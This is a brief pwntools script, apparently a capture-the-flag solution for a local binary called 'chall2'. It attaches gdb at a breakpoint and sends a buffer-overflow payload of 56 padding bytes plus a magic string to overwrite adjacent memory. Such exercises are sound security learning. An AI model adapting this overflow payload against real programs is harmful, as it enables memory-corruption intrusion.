from pwn import *
elf = context.binary = ELF("./chall2")
r = elf.process()
gdb.attach(r, '''
    b* main + 45\n
           c
''')
           
payload = b"A" * 56 + b"Kinabler"
r.send(payload)

r.interactive()